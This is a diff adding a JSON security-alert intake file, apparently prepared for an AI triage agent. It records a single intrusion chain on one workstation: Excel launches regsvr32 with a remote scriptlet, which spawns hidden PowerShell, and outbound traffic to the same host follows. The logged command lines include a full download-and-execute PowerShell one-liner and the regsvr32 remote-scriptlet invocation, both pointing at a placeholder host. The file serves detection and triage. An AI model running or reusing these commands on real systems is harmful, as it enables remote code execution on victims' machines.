@@ -1,0 +1,281 @@
+{
+  "schema": "talonsoclab.soc-intake/v3",
+  "generated": "2026-08-11T18:00:00Z",
+  "source": "talonsoclab",
+  "consumer": "casa-ai-agent (github.com/ktalons/casa-ai-agent)",
+  "window": {
+    "start": "2026-08-10T18:00:00Z",
+    "end": "2026-08-11T18:00:00Z",
+    "lookback_hours": 24
+  },
+  "filter": {
+    "min_level": 12,
+    "include_rule_ids": [],
+    "cap": 200,
+    "order": "newest_first"
+  },
+  "truncated": false,
+  "counts": [
+    {
+      "date": "2026-08-10",
+      "matched": 0,
+      "included": 0
+    },
+    {
+      "date": "2026-08-11",
+      "matched": 5,
+      "included": 5
+    }
+  ],
+  "pipeline": {
+    "collector_ok": true,
+    "agents_reporting": 6,
+    "last_event_seen": "2026-08-11T17:58:03.512Z"
+  },
+  "detections": [
+    {
+      "level": 14,
+      "description": "Sysmon: PowerShell with hidden window and no profile spawned by regsvr32.exe",
+      "rule_id": "100924",
+      "agent": "corpws44",
+      "mitre": [
+        "T1059.001"
+      ],
+      "timestamp": "2026-08-11T14:21:09.336817Z",
+      "alert_id": "1786458069.000931",
+      "tactic": [
+        "execution"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "process_creation"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100924",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "1",
+      "sysmon": {
+        "process_create": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "command_line": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('https://cdn.files-sync.example/s/stage2.ps1'))\"",
+          "parent_image": "C:\\Windows\\System32\\regsvr32.exe",
+          "parent_command_line": "regsvr32.exe /s /n /u /i:https://cdn.files-sync.example/s/upd.sct scrobj.dll",
+          "process_id": 3360,
+          "parent_process_id": 9188,
+          "process_guid": "{5f2c81d0-6b15-66b8-4101-000000002a00}",
+          "parent_process_guid": "{5f2c81d0-6b13-66b8-3f01-000000002a00}",
+          "user": "CORP\\u-ap09",
+          "integrity_level": "Medium",
+          "current_directory": "C:\\Users\\u-ap09\\Documents\\",
+          "hashes": null
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 12,
+      "description": "Suricata: outbound TLS from a user workstation to a host first seen today, WinHTTP client fingerprint",
+      "rule_id": "100926",
+      "agent": "corpnsm05",
+      "mitre": [
+        "T1071.001"
+      ],
+      "timestamp": "2026-08-11T14:21:08.104552Z",
+      "alert_id": "1786458068.000932",
+      "tactic": [
+        "command-and-control"
+      ],
+      "groups": [
+        "suricata",
+        "ids",
+        "tls"
+      ],
+      "engine": {
+        "name": "suricata",
+        "rule_id": "1000131",
+        "rev": 1
+      },
+      "src_ip": "192.0.2.64",
+      "src_port": 50744,
+      "dst_ip": "203.0.113.87",
+      "dst_port": 443,
+      "proto": "tcp",
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": null,
+      "sysmon": null,
+      "suricata": {
+        "event_type": "alert",
+        "signature": "LOCAL POLICY TLS client hello with WinHTTP JA3 to an SNI first seen today",
+        "category": "Potentially Bad Traffic",
+        "severity": 2,
+        "action": "allowed",
+        "flow_id": "1129774520386615",
+        "app_proto": "tls",
+        "http_hostname": null,
+        "http_url": null,
+        "http_user_agent": null,
+        "tls_sni": "cdn.files-sync.example",
+        "dns_rrname": null
+      }
+    },
+    {
+      "level": 12,
+      "description": "Sysmon: regsvr32.exe made an outbound network connection",
+      "rule_id": "100923",
+      "agent": "corpws44",
+      "mitre": [
+        "T1218.010"
+      ],
+      "timestamp": "2026-08-11T14:21:07.951208Z",
+      "alert_id": "1786458067.000933",
+      "tactic": [
+        "defense-evasion"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "network_connection"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100923",
+        "rev": null
+      },
+      "src_ip": "192.0.2.64",
+      "src_port": 50744,
+      "dst_ip": "203.0.113.87",
+      "dst_port": 443,
+      "proto": "tcp",
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "3",
+      "sysmon": {
+        "network_connect": {
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "process_id": 9188,
+          "process_guid": "{5f2c81d0-6b13-66b8-3f01-000000002a00}",
+          "user": "CORP\\u-ap09",
+          "initiated": true,
+          "source_hostname": "corpws44.corp.example",
+          "destination_hostname": "cdn.files-sync.example"
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 12,
+      "description": "Sysmon: regsvr32.exe resolved an external domain",
+      "rule_id": "100922",
+      "agent": "corpws44",
+      "mitre": [
+        "T1218.010"
+      ],
+      "timestamp": "2026-08-11T14:21:07.702Z",
+      "alert_id": "1786458067.000934",
+      "tactic": [
+        "defense-evasion"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "dns_query"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100922",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "22",
+      "sysmon": {
+        "dns_query": {
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "process_id": 9188,
+          "process_guid": "{5f2c81d0-6b13-66b8-3f01-000000002a00}",
+          "user": "CORP\\u-ap09",
+          "query_name": "cdn.files-sync.example",
+          "query_status": "0",
+          "query_results": "203.0.113.87;"
+        }
+      },
+      "suricata": null
+    },
+    {
+      "level": 13,
+      "description": "Sysmon: regsvr32.exe loading scrobj.dll with a remote /i: argument, spawned by an Office application",
+      "rule_id": "100921",
+      "agent": "corpws44",
+      "mitre": [
+        "T1218.010"
+      ],
+      "timestamp": "2026-08-11T14:21:07.418390Z",
+      "alert_id": "1786458067.000935",
+      "tactic": [
+        "defense-evasion"
+      ],
+      "groups": [
+        "windows",
+        "sysmon",
+        "process_creation"
+      ],
+      "engine": {
+        "name": "wazuh",
+        "rule_id": "100921",
+        "rev": null
+      },
+      "src_ip": null,
+      "src_port": null,
+      "dst_ip": null,
+      "dst_port": null,
+      "proto": null,
+      "subject_user": null,
+      "target_user": null,
+      "logon_type": null,
+      "event_id": "1",
+      "sysmon": {
+        "process_create": {
+          "image": "C:\\Windows\\System32\\regsvr32.exe",
+          "command_line": "regsvr32.exe /s /n /u /i:https://cdn.files-sync.example/s/upd.sct scrobj.dll",
+          "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+          "parent_command_line": "\"C:\\Program Files\\Microsoft Office\\Root\\Office16\\EXCEL.EXE\" \"C:\\Users\\u-ap09\\Downloads\\remittance-0811.xlsm\"",
+          "process_id": 9188,
+          "parent_process_id": 7412,
+          "process_guid": "{5f2c81d0-6b13-66b8-3f01-000000002a00}",
+          "parent_process_guid": "{5f2c81d0-4a7e-66b8-2c01-000000002a00}",
+          "user": "CORP\\u-ap09",
+          "integrity_level": "Medium",
+          "current_directory": "C:\\Users\\u-ap09\\Documents\\",
+          "hashes": null
+        }
+      },
+      "suricata": null
+    }
+  ],
+  "recon_delta": {
+    "markdown": "## Recon delta — 2026-08-11\n\n- No new or removed services against the 2026-08-04 baseline.\n",
+    "baseline": "2026-08-04",
+    "changes": []
+  },
+  "note": "Deterministic intake. Reasoning happens in CASA, not here."
+}
